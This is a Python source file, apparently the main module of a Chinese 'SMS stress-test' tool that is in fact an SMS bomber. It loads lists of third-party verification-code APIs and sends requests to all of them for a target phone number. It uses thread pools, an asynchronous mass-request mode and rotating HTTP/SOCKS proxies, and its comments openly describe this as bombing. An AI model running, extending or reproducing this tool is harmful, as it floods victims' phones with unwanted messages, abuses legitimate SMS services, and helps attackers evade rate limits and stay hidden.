# encoding=utf8
# 短信测压主程序

from utils.models import API
from utils.req import reqFunc, reqFuncByProxy, runAsync
from concurrent.futures import ThreadPoolExecutor
from typing import List, Union
import asyncio
import json
import pathlib
import sys
import os

temp = 0

# 確定應用程序係一個腳本文件或凍結EXE
if getattr(sys, 'frozen', False):
    path = os.path.dirname(sys.executable)
elif __file__:
    path = os.path.dirname(__file__)


def load_proxies() -> list:
    """load proxies for files
    :return: proxies list
    """
    proxy_all = []
    proxy_file = ["http_proxy.txt", "socks5_proxy.txt", "socks4_proxy.txt"]
    for fn in proxy_file:
        f_obj = pathlib.Path(path, fn)
        if f_obj.exists():
            proxy_lst = pathlib.Path(path, fn).read_text(
                encoding="utf8").split("\n")
            if not proxy_lst:
                continue
            if fn == "http_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'http://' + proxy})
            elif fn == "socks5_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'socks5://' + proxy})
            elif fn == "socks4_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'socks4://' + proxy})
        else:
            f_obj.touch()
    return proxy_all


def load_json() -> List[API]:
    """load json for api.json
    :return: api list
    """
    json_path = pathlib.Path(path, 'api.json')
    if not json_path.exists():
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            return APIs
        except Exception as why:
            raise ValueError


def load_getapi() -> list:
    """load GETAPI
    :return:
    """
    json_path = pathlib.Path(path, 'GETAPI.json')
    if not json_path.exists():
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            return datas
        except Exception as why:
            raise ValueError


# @click.command()
# @click.option("--thread", "-t", help="线程数(默认64)", default=64)
# @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
# @click.option('--frequency', "-f", default=1, help="执行次数(默认1次)", type=int)
# @click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
# @click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
def runboom(phone: Union[str, tuple], enable_proxy: bool = False):
    global temp
    temp = 1
    """传入线程数和手机号启动轰炸,支持多手机号"""
    try:
        _api = load_json()
        _api_get = load_getapi()
        _proxies = load_proxies()
        # fix: by Ethan
        if not _proxies:
            if enable_proxy:
                sys.exit(1)
            _proxies = [None]
    except ValueError:
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=64) as pool:
        for i in range(1, 1 + 1):
            # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
            for proxy in _proxies:
                # 不可用的代理或API过多可能会影响轰炸效果
                for api in _api:
                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api, phone)
                for api_get in _api_get:
                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api_get, phone)
            temp = 0



def asyncRun(phone):
    """以最快的方式请求接口(真异步百万并发)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    loop = asyncio.get_event_loop()
    loop.run_until_complete(runAsync(apis, phone))


def oneRun(phone):
    """单线程(测试使用)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    for api in apis:
        try:
            reqFunc(api, phone)
        except:
            pass

